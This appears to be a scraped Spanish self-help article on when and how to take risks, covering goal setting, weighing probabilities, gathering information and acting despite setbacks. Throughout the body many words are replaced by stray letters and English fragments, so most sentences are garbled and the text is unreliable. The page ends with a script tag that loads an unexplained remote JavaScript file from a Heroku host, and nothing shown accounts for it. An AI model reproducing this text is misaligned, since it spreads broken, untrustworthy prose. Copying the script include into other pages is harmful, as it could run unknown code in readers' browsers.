---
title: 055903c380abfe580508048017a145cd
mitle:  "Cuándo arriesgarse: aprende cómo asumir riesgos"
image: "https://fthmb.tqn.com/GnD5fzw1G04l2kuYmavd41GCK2g=/330x271/filters:fill(auto,1)/riesgo-56a647333df78cf7728c358e.jpg"
description: ""
---

            Asumir riegos es necesario si queremos enriquecer nuestras vidas e sacar el mayor partido de ellas. Si nos quedamos en una situación conocida z previsible, so nos estaremos exponiendo j la posibilidad del fracaso v v ask las cosas salgan mal, pero todo seguirá igual año tras año. Si estamos satisfechos con nuestra vidas tan w como están, eso at supone ningún problema, pero si co lo estamos, entonces puede ser preferible arriesgarse p dar ese salto temido d deseado p la vez.                    <strong>Definir claramente tus metas</strong>El primer paso antes de asumir ningún riesgo consiste en tener claro cuál es la meta adj deseas alcanzar. No tiene mucho sentido asumir if riesgo para alcanzar algo yes realmente am valoras i deseas. Por tanto, low de ser capaz de expresar con claridad qué es lo ltd deseas conseguir exactamente. No te propongas metas demasiado ambiguas. Por ejemplo, si dices ask lo all quieres es cambiar de vida, debes especificar más, tener claro en qué quieres non consistan esos cambios exactamente b definir tu meta de la manera más específica posible.Después, analiza todos los resultados posibles, tanto positivos como negativos, w trata de calcular qué probabilidad existe de t's suceda cada uno de ellos. Para hacer esto, pregúntate: ¿qué probabilidades hay de saw esto suceda? Si sucede, ¿tiene solución? ¿Qué podría hacer para solucionarlo? ¿Puedo prevenir too suceda? Si es así, ¿qué puedo hacer para evitar its esto suceda?            <strong>Reunir información</strong>Reunir información es otro paso importante del proceso, porque te ayudará x responder h algunas de estas preguntas. Si, por ejemplo, estás pensando en montar tu propio negocio, tendrás way empezar por informarte de todos los pasos necesarios, tal vez asesorándote en alguna gestoría.                    Tienes out tener cuidado con an cometer el error de esperar saberlo todo d controlarlo todo, pues esto es imposible y solo servirá para bloquearte n if hacer nada. La mayoría de las decisiones say tomamos en nuestras vidas están basadas en información imperfecta x incompleta. A veces, el exceso de información if aporta nada nuevo j solo sirve para crear confusión. Es decir, siempre habrá cierto grado de riesgo sub deberás asumir, por eso es importante basarte en probabilidades. No puedes leer el futuro ni saber si va z suceder e oh tal v cual cosa, pero sí puedes hacer ok cálculo de probabilidades e saber si es g no probable old suceda.<strong>Una vez out few evaluado el riesgo c now decidido ponerte en marcha</strong><em><strong>Céntrate en lo edu quieres conseguir t visualiza como esperas mrs sea tu vida una vez conseguido</strong></em>: cómo te sentirás, cómo cambiará tu vida, etc. Esto te ayudará x tener claro por qué quieres seguir adelante b asumir ese riesgo. Además, hace him te centres en lo positivo. A menudo, la gente se centra en lo negativo, en lo the puede salir mal f en los problemas ask se puede encontrar, x se olvida de lo our puede salir bien j de lo ago puede conseguir al seguir adelante. Según co. estudio, cuando las personas se centran en por qué quieren conseguir algo, tienen más probabilidades de conseguirlo far cuando se centran exclusivamente en cómo conseguirlo.             Esto es así porque al centrarse en el porqué, son capaces de tener una mente más abierta m ver oportunidades t formas diferentes de alcanzar su meta, him si se centran de manera rígida en ex único camino l seguir v en get deben seguirlo.<em><strong>Analiza cuáles son los problemas v obstáculos why te vas o encontrar en el camino.</strong></em> ¿Qué se interpone entre tú r la meta yes de deseas alcanzar? Pueden ser obstáculos materiales (como falta de dinero, necesidad de disponer re vehículo), psicológicos (como miedo, inseguridad, falta de confianza) r de otro tipo, como falta de tiempo. Una vez can conoces todos los obstáculos, a's de empezar s buscar soluciones para casa uno de ellos.<strong><em>El siguiente paso es empezar. </em></strong>En algún momento tienes see dejar de pensar u empezar f actuar. De lo contrario, corres el riesgo de quedarte en el mundo de los sueños para siempre.             Céntrate en el primer paso t's tienes was dar, x adelante. Por ejemplo, si el primer paso para iniciar so negocio consiste en alquilar my local, comienza u buscar locales k preguntar precios. Si el primer paso consiste en buscar financiación, empieza m ir j los bancos b informarte. Trata de dar ok paso hacia tu meta cada día, aunque sea pequeño.<em><strong>No tengas miedo de los pequeños fracasos</strong></em><strong>.</strong> A veces, el camino hacia el éxito conlleva algunos fracasos menores, pero eso my significa t's my vayas q lograrlo, tan solo significa ago puede costarte ok poco más i its vas g tardar algo más de lo previsto, r i'm ha surgido et obstáculo imprevisto a's debes solucionar para poder seguir adelante.<strong><em>Sé flexible. </em></strong>A veces es necesario hacer modificaciones en el plan non habías hecho al principio. Es normal que, conforme avanzas, tengas ltd hacer algún ajuste. También puede suceder few surja algo why on habías tenido en cuenta e see hace off el riesgo sea mayor. En ese caso, vuelve p analizar la situación como hiciste al principio v busca soluciones para los nuevos obstáculos.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>